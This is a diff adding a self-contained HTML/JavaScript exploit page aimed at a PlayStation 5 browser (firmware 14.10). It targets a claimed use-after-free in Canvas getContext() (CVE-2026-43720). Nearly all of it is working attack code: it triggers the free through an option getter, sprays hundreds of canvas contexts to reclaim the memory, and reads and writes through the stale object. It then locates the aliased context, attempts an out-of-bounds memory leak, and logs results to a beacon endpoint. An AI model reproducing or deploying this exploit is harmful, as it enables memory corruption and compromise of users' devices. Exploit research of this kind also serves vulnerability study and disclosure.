@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>PS5 14.10 Canvas UAF</title>
+<style>html,body{background:#000;color:#0f0;font:12px monospace;margin:8px}#out{white-space:pre-wrap}</style>
+</head>
+<body><pre id="out">=== Canvas getContext() UAF (CVE-2026-43720) ===</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(msg){
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent(msg),true);x.send();}catch(e){}
+}
+
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}
+
+bk('UA: '+navigator.userAgent);
+
+/* ===== PHASE 1: UAF TRIGGER ===== */
+bk('[1] Triggering Canvas getContext() UAF...');
+
+var innerCtx=null;
+var getterRan=false;
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+
+var opts={};
+Object.defineProperty(opts,'alpha',{get:function(){
+  getterRan=true;
+  innerCtx=canvas.getContext('2d');
+  /* Do some saves to grow stateStack for later OOB read */
+  for(var s=0;s<8;s++) innerCtx.save();
+  innerCtx.lineWidth=1.0;
+  return true;
+}});
+
+var bmrCtx=canvas.getContext('bitmaprenderer',opts);
+bk('[1] getter='+getterRan+' inner='+(innerCtx?'OK':'NULL')+' bmr='+(bmrCtx?'OK':'NULL'));
+
+if(!innerCtx){
+  bk('[FAIL] No inner context - UAF trigger failed');
+} else {
+  /* ===== PHASE 2: SAME-TYPE SPRAY ===== */
+  bk('[2] Spraying 500 Canvas2D contexts (768B each)...');
+
+  var MARKER=7777.77;
+  var sprayC=[];
+  var sprayX=[];
+  for(var i=0;i<500;i++){
+    var sc=document.createElement('canvas');
+    sc.width=1;sc.height=1;
+    var sx=sc.getContext('2d');
+    if(sx){
+      sx.lineWidth=MARKER;
+      sprayC.push(sc);
+      sprayX.push(sx);
+    }
+  }
+  bk('[2] Sprayed '+sprayX.length+' contexts, marker='+MARKER);
+
+  /* ===== PHASE 3: READ THROUGH STALE WRAPPER ===== */
+  var lwR,mlR,gaR,err;
+  try{lwR=innerCtx.lineWidth;}catch(e){err='lw:'+e.message;}
+  try{mlR=innerCtx.miterLimit;}catch(e){err=(err||'')+' ml:'+e.message;}
+  try{gaR=innerCtx.globalAlpha;}catch(e){err=(err||'')+' ga:'+e.message;}
+
+  if(err){
+    bk('[3] READ ERROR: '+err);
+  } else {
+    var lwB=dblBits(lwR);
+    bk('[3] lineWidth='+lwR+' raw='+hexPair(lwB.hi,lwB.lo));
+    bk('[3] miterLimit='+mlR+' globalAlpha='+gaR);
+
+    if(lwR===MARKER){
+      bk('[3] *** RECLAIM CONFIRMED: lineWidth matches spray marker ***');
+    } else if(lwR===1.0){
+      bk('[3] lineWidth=1.0 (default or ref-pin, context may still be alive)');
+    } else {
+      bk('[3] UNEXPECTED lineWidth='+lwR+' (stale/garbage data)');
+    }
+  }
+
+  /* ===== PHASE 4: WRITE TEST ===== */
+  try{
+    innerCtx.lineWidth=9999.99;
+    var lwW=innerCtx.lineWidth;
+    bk('[4] WRITE: set 9999.99, read back '+lwW+', match='+(lwW===9999.99));
+  }catch(e){
+    bk('[4] WRITE ERROR: '+e.message);
+  }
+
+  /* ===== PHASE 5: ALIAS IDENTIFICATION ===== */
+  if(lwR===MARKER){
+    for(var j=0;j<sprayX.length;j++){
+      if(sprayX[j].lineWidth===9999.99){
+        bk('[5] ALIAS: spray #'+j+' reads 9999.99 - this is the reclaimer');
+        break;
+      }
+    }
+  }
+
+  /* ===== PHASE 6: ADDITIONAL API TESTS ===== */
+  try{
+    var dash=innerCtx.getLineDash();
+    bk('[6] getLineDash: '+dash.length+' entries');
+  }catch(e){bk('[6] getLineDash ERR: '+e.message);}
+
+  try{
+    var fs=innerCtx.fillStyle;
+    bk('[6] fillStyle: '+fs);
+  }catch(e){bk('[6] fillStyle ERR: '+e.message);}
+
+  try{
+    var t=innerCtx.getTransform();
+    bk('[6] transform: a='+t.a+',b='+t.b+',c='+t.c+',d='+t.d+',e='+t.e+',f='+t.f);
+  }catch(e){bk('[6] transform ERR: '+e.message);}
+
+  try{
+    innerCtx.setLineDash([100,200,300]);
+    var d2=innerCtx.getLineDash();
+    bk('[6] setLineDash/get round-trip: '+d2.join(','));
+  }catch(e){bk('[6] setLineDash ERR: '+e.message);}
+
+  try{
+    var mt=innerCtx.measureText('test');
+    bk('[6] measureText width='+mt.width);
+  }catch(e){bk('[6] measureText ERR: '+e.message);}
+
+  /* ===== PHASE 7: STATE STACK OOB READ (info leak attempt) ===== */
+  /* innerCtx had 8 saves, so m_stateStack.m_size=9.
+     After reclaim, the new ctx has m_size=1.
+     Reading via stale wrapper with m_size=9 reads past end of buffer.
+     m_stateStack.last() returns buffer[m_size-1] = buffer[8]
+     which is 8*400 = 3200 bytes into the buffer, 2800 past end. */
+  bk('[7] Attempting OOB state read via save/restore mismatch...');
+  try{
+    /* Read lineWidth from the "last" state (which is OOB) */
+    innerCtx.restore(); /* pops to state[7] */
+    var oob1=innerCtx.lineWidth;
+    var oob1B=dblBits(oob1);
+    bk('[7] After 1 restore: lineWidth='+oob1+' raw='+hexPair(oob1B.hi,oob1B.lo));
+  }catch(e){bk('[7] restore ERR: '+e.message);}
+
+  bk('[DONE] Canvas UAF probe complete');
+}
+</script>
+</body></html>
